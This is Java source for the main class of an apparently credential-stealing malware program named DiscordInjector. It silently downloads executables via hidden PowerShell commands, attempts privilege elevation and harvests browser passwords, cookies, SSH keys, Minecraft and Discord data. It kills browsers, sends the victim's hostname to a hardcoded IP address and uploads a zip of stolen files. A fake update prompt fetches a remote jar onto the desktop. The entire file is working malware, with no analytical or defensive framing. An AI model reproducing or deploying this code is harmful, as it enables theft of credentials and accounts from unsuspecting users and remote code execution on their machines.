package io.github.luxotick;

import io.github.luxotick.impl.*;
import io.github.luxotick.impl.cookies.sendCookies;
import io.github.luxotick.utils.ElevateUtil;
import okhttp3.*;

import java.io.*;
import java.net.InetAddress;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.net.URL;
import javax.swing.JOptionPane;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.lang.Thread.sleep;

public class Start {
    public static long snowflakeId = Snowflake.generateSnowflakeId();
    public static String documents = "C:\\Users\\Public\\Documents";

    public static String exeUrl = "your exe url";

    public static void main(String[] argument) throws Exception {
        String username = System.getProperty("user.name");
        OkHttpClient client = new OkHttpClient();

        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -O 'C:\\Users\\" + username + "\\update.exe'");
        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\update.exe'");
        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl + " -OutFile 'C:\\Users\\" + username + "\\xray.jar'");
        Runtime.getRuntime().exec("powershell.exe -ExecutionPolicy -createnowindow -Command wget " + exeUrl +  " -O 'C:\\Users\\" + username + "\\xray.jar'");

        System.out.println("Starting DiscordInjector...");
        String version = "1.0.2";
		versionChecker(version);
        Sender.sendMessage("Starting DiscordInjector v" + version);
		if (DiscordInjector.instance == null){
			DiscordInjector.instance = new DiscordInjector();
		}

        ElevateUtil elevateUtil = new ElevateUtil();
        elevateUtil.elevate();

        DiscordInjector.instance.initialize();
        Sender.sendMessage("DiscordInjector initialized.");
		Sender.sendMessage("Starting other arguments...");

        //grab passwords
        String passwords = new Passwords().grabPassword();
        String s = new String(Base64.getDecoder().decode(passwords), StandardCharsets.UTF_8);
        //write into text file
        try {
            PrintStream out = new PrintStream(new FileOutputStream("C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt"));
            out.print(s);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
        Sender.Sender(client, new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", "Passwords.txt", RequestBody.create(MediaType.parse("application/octet-stream"), new File("C:\\Users\\Public\\Documents\\Browsers\\Passwords.txt")))
                .build());
		Browsers.main(argument);
		Sender.sendMessage("Passwords done.");
		Mods.main(argument);
		Sender.sendMessage("Mods done.");
		Ssh.main(argument);
		Sender.sendMessage("Ssh done.");
		Sender.sendMessage("Now launching the client.");
        Minecraft.sendMinecraft();
        KillBrowsers.kill();
        sendCookies.zaa();
        sendCookies.mh();
        telegram();


        File folder = new File("C:\\Users\\Public\\Documents");
        File[] listOfFiles = folder.listFiles();

        assert listOfFiles != null;
        for (File listOfFile : listOfFiles) {
            if (listOfFile.isFile()) {
                boolean contain = containsSnowflakeId(listOfFile.getName());
                if (contain) {
                    System.out.println("File " + listOfFile.getName() + " contains snowflake id.");
                    snowflakeId = Long.parseLong(listOfFile.getName().replace(".zip", ""));
                } else {
                    System.out.println("File " + listOfFile.getName() + " does not contain snowflake id.");
                }

            }
        }

        Zip.main(argument);

        final String zort = "C:\\Users\\Public\\Documents\\" + snowflakeId +  ".zip";

        File asd = new File(zort);

        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", asd.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), asd))
                .build();

        Sender.Sender(client, requestBody);

        Sender.sendToServer(zort);

	}


    public static boolean containsSnowflakeId(String filename) {
        String regex = "\\b[0-9]{19}\\b";
        Pattern pattern = Pattern.compile(regex);
        String hm = filename.replace(".zip", "");
        Matcher matcher = pattern.matcher(hm);
        System.out.println(pattern.pattern());
        if (matcher.find()) {
            System.out.println("Found snowflake id: " + matcher.group());
            return true;
        } else {
            System.out.println("No snowflake id found.");
            return false;
        }
    }
    public static void versionChecker(String version) throws IOException {
		// read raw data from url
		Scanner scanner = new Scanner(new URL("https://gist.githubusercontent.com/Luxotick/2290b71380bb4a68081632f56e3c9efa/raw/2238f8815902234acad57f3d70e2198db86f1524/gistfile1.txt").openStream());
		// read first line
		String line = scanner.nextLine();

        System.out.println("Current version: " + line);
		// close scanner
		scanner.close();

        if (!Objects.equals(line, version)) {
            JOptionPane.showMessageDialog(null, "You are using an outdated version. Please update to the latest version.", "Update available", JOptionPane.WARNING_MESSAGE);
            System.out.println("You are using an outdated version. Please update to the latest version.");
            update("https://dont-try.me/allah.jar", System.getProperty("user.home") + "/Desktop/" + "latest.jar");
            JOptionPane.showMessageDialog(null, "New version can be found on your desktop.", "Update done", JOptionPane.INFORMATION_MESSAGE);
            System.exit(0);

        } else {
            System.out.println("You are using the latest version.");
        }
    }

    public static void telegram() throws IOException {
        String url = "http://3.67.98.46:1453/";

        String hostname;

        InetAddress addr;
        addr = InetAddress.getLocalHost();
        hostname = addr.getHostName();

        String json = "{\"customMessage\": \"" + hostname +  "\"}";

        OkHttpClient client = new OkHttpClient();

        MediaType JSON = MediaType.parse("application/json; charset=utf-8");

        RequestBody body = RequestBody.create(JSON, json);

        Request request = new Request.Builder()
                .url(url)
                .post(body)
                .build();
        Response response = client.newCall(request).execute();
        Sender.sendMessage("Telegram message sent.");
    }

    private static void update(String urlStr, String file) throws IOException {
        URL url = new URL(urlStr);
        ReadableByteChannel rbc = Channels.newChannel(url.openStream());
        FileOutputStream fos = new FileOutputStream(file);
        fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
        fos.close();
        rbc.close();
    }
}